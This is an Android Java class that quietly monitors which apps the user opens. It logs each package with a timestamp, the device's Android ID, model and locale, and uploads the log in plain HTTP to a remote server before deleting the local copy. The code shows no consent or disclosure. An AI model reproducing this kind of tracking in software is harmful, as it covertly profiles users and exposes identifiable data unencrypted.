package com.statist.grap;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.Settings.Secure;
import android.util.Log;

public class StatManager {
	private Context mContext;
	private static final String TAG = "statLogs";
	private static String lastPackage = "";
	private static int count = 1;

	public StatManager(Context context) {
		mContext = context;
	}

	public void collect() {
		ActivityManager am = (ActivityManager) mContext.getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningTaskInfo> runningTaskInfos = am.getRunningTasks(1);
		ComponentName topActivityInfo = runningTaskInfos.get(0).topActivity;
		Log.d(TAG, "CUR APP = " + topActivityInfo.getPackageName());
		if (lastPackage.equals("")) {
			lastPackage = topActivityInfo.getPackageName();
			return;
		}

		if (topActivityInfo.getPackageName().equals(lastPackage)) {
			count++;
		} else {
			writeLog(lastPackage, count);
			lastPackage = topActivityInfo.getPackageName();
			count = 1;
		}
		if (isOnline())
			sendInfoToServer();
	}

	@SuppressLint("DefaultLocale")
	private void writeLog(String pack, int c) {
		String android_id = Secure.getString(mContext.getContentResolver(),	Secure.ANDROID_ID);
		String lograw = pack + ";"	+ c	+ ";" + System.currentTimeMillis() + ";" + android_id + ";"
				+ android.os.Build.VERSION.SDK_INT + ";" + android.os.Build.MODEL + ";" + android.os.Build.PRODUCT
				+ ";" + Build.MANUFACTURER + ";" + Locale.getDefault().toString().toLowerCase().replaceAll("[^A-Za-z0-9]", "");

		if (!isSystemPackage(pack)) {
			Log.d(TAG, "lograw: " + lograw);
			try {
				OutputStreamWriter outputStreamWriter = new OutputStreamWriter(mContext.openFileOutput("logs.txt", Context.MODE_PRIVATE | Context.MODE_APPEND));
				outputStreamWriter.write(lograw + "\n");
				outputStreamWriter.close();
			} catch (IOException e) {
				Log.e("Exception", "File write failed: " + e.toString());
			}
			Log.d(TAG, "лог записан");
		}
	}
	
	private void sendInfoToServer() {
		String file = "";		
		try {
			InputStream inputStream = mContext.openFileInput("logs.txt");
			if (inputStream != null) {
				InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
				BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
				String receiveString = "";
				StringBuilder stringBuilder = new StringBuilder();
				while ((receiveString = bufferedReader.readLine()) != null)
					stringBuilder.append(receiveString).append("\n");
				inputStream.close();
				file = stringBuilder.toString();
			}
		} catch (FileNotFoundException e) {
			Log.e("login activity", "File not found: " + e.toString());
		} catch (IOException e) {
			Log.e("login activity", "Can not read file: " + e.toString());
		}
		final String ret = file;
		Log.d(TAG, "online");
		Thread sendThread = new Thread(new Runnable(){
		    @Override
		    public void run() {
		        try {
		        	HttpClient httpclient = new DefaultHttpClient();
		    		HttpPost httppost = new HttpPost("http://atestidfa.lider-plus.com/index.php");
		    		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
					nameValuePairs.add(new BasicNameValuePair("logpart", ret));
					nameValuePairs.add(new BasicNameValuePair("p", "hi"));
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
					httpclient.execute(httppost);
					Log.d(TAG, "execute");
					File dir = mContext.getFilesDir();
					File file = new File(dir, "logs.txt");
					file.delete();
		        } catch (ClientProtocolException e) {
					Log.d(TAG, "ClientProtocolException");
				} catch (IOException e) {
					Log.d(TAG, "IOException");
				}
		    }
		});
		sendThread.start(); 
	}

	private boolean isSystemPackage(String packageName) {
		final PackageManager pm = mContext.getPackageManager();
		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
		for (ApplicationInfo packageInfo : packages) {
			if (packageInfo.packageName.equals(packageName)) {
				return ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) ? true : false;
			}
		}
		return true;
	}
	
	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnected()) {
			return true;
		}
		return false;
	}
}
